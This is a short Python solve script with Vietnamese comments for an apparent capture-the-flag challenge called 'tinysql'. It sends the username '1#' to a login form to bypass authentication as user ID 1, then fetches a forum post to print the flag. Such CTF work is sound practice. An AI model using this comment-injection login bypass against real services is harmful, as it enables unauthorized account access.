import requests

# Nhớ cập nhật đúng URL instance của bạn
BASE_URL = "https://tinysql-1-dbe344e8b239f31b.instancer.batmans.kitchen"

def solve():
    session = requests.Session()
    
    # Payload mới: Dùng ID thay vì Username
    payload = {
        "user": "1#",  # Ép server thực hiện lệnh S:1
        "pass": "anything"
    }

    print(f"[*] Đang thử bypass bằng ID injection: {BASE_URL}")
    try:
        # 1. Thực hiện Login
        res = session.post(f"{BASE_URL}/login", data=payload, allow_redirects=True)
        
        # 2. Kiểm tra nếu URL không còn chữ 'login' nghĩa là đã vào trang chủ
        if "login" not in res.url.lower():
            print("[+] Login thành công bằng ID 1!")
            
            # 3. Lấy flag tại post 3
            flag_res = session.get(f"{BASE_URL}/forum/post/3")
            print("[!] Kết quả tìm kiếm Flag:")
            print("-" * 30)
            # In ra nội dung trang để tìm flag (thường có định dạng BKCTF{...})
            print(flag_res.text)
            print("-" * 30)
        else:
            print("[-] Vẫn không login được. Thử đổi '1#' thành '2#' hoặc '3#' xem sao.")

    except Exception as e:
        print(f"[-] Lỗi: {e}")

if __name__ == "__main__":
    solve()